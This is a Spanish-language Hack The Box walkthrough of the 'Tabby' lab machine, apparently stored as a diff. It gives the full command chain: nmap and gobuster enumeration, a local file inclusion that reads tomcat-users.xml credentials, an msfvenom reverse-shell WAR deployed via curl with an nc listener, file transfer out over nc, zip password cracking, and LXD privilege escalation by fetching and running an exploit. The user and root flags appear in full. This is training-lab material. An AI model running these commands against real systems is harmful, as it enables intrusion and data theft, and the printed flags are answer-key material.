@@ -1,0 +1,91 @@
+----- TABBY HACK THE BOX -----
+IP:10.10.10.194
+
+nmap 10.10.10.194
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 20:09 EDT
+Nmap scan report for megahosting.htb (10.10.10.194)
+Host is up (0.040s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Comprobamos el puerto 8080 y vemos que tiene instalado Tomcat, incluso podemos acceder al panel de administrador, solo nos haria falta usuario y contraseña
+
+2. Accedemos a ver la web que tiene montada. Comprobamos los archivos ocultos con gobuster
+	
+	gobuster dir -u 10.10.10.191 -w /usr/share/wordlists/dirb/common.txt -x txt,php,py,cgi
+
+La url parece injectable, vamos a probar la inclusion local de archivos (local file inclusion). Googleando  megahosting exploit podemos encontrar informacion al respecto
+Probamos los siguientes parametros y obtenemos credenciales de acceso a tomcat
+	
+	http://10.10.10.194/news.php?file=../../../../etc/passwd
+	http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml  (pagina en blanco, inspeccionamos la pagina y obtenemos credenciales)
+	user: tomcat
+	pass: $3cureP4s5w0rd123!
+
+3. Accedemos al panel de control de tomcat. Una vez dentro vamos a crear un host virtual para subir un payload de reverse shell
+	msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.240 LPORT=4444 -f war > shell.war     -> creamos payload	
+	curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/rev_shell' -> virtual host creado con el payload 
+	nc -nlvp 4444 
+	curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/rev_shell/
+
+	We got shell!
+
+4. establecemos una consola interactiva
+	
+	python3 -c 'import pty;pty.spawn("/bin/bash")'
+	accedemos al directorio /var/www/html/files -> backup.zip
+	
+	Para descargar el fichero en nuestro pc:
+	En una nueva consola -> nc -lvnp 1234 > 16162020_backup.zip
+	Y en la consola en remoto -> nc -w 4 10.10.14.240 1234 < 16162020_backup.zip
+	Ya tenemos el archivo!
+
+5. Descomprimimos el archivo en busca de informacion
+
+	fcrackzip -u -D -p '/home/kaliniko/Downloads/rockyou.txt' '/home/kaliniko/16162020_backup.zip'
+	pass: admin@it
+
+6. Acceso a usuario
+
+	whoami -> ash
+	Vamos a probar con la contraseña obtenida anteriormente
+	Accedemos al usuaio ash
+	cd /home/Ash/Desktop
+
+---- FLAG DE USUARIO ----
+62ce0cdf7401efee5d12d7964981cdd4
+
+
+
+------ escalando a root ----
+observamos que el usuario ash es miembro del grupo IXD.
+clonamos el siguiente repositorio
+
+	git clone https://github.com/saghul/lxd-alpine-builder.git
+	cd lxd-alpine-builder/
+	sudo bash build-alpine
+
+Lo dejamos en la raiz del sistema y montamos un servidor simple con python
+	
+	python -m simplehttpserver 80
+
+En el directorio de ash descargamos el directorio que hemos clonado anteriormente
+
+	wget http://10.10.14.240/alpine-v3.12-x86_64-20200806_0441.tar.gz
+	
+	vemos que se realiza la descarga, por lo tanto probamos con un exploit, repetimos el proceso. Descargar el exploit, colocarlo en la raiz,
+	descargarlo y ejecutarlo en el directorio de ash
+
+	wget http://10.10.14.240/exploit1.sh
+
+	./exploit.sh
+
+	Ya tenemos acceso como root, cd /root
+
+---- FLAG DE ROOT ----
+
+
+8dcac66454b70cd0a97322d3d73b79be
